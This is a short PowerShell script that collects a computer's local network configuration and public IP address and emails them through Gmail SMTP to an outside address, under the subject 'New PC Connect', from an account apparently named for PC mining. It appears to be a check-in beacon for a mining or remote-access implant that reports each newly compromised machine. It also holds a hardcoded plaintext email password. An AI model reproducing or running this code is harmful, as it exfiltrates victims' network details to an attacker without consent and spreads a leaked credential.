$IP_Locale = ipconfig
$IP_Publique = Invoke-RestMethod -Uri ('https://ipinfo.io/')
$EmailFrom = "PCMining78@gmail.com"
$EmailTo = "goginulio58@gmail.com"
$Subject = "New PC Connect"
$Body = "Success ! , $IP_Locale , $IP_Publique"
$SMTPServer = "smtp.gmail.com"
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("PCMining78@gmail.com", "Z87+gC!8]Wx6Ri}c");
$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)

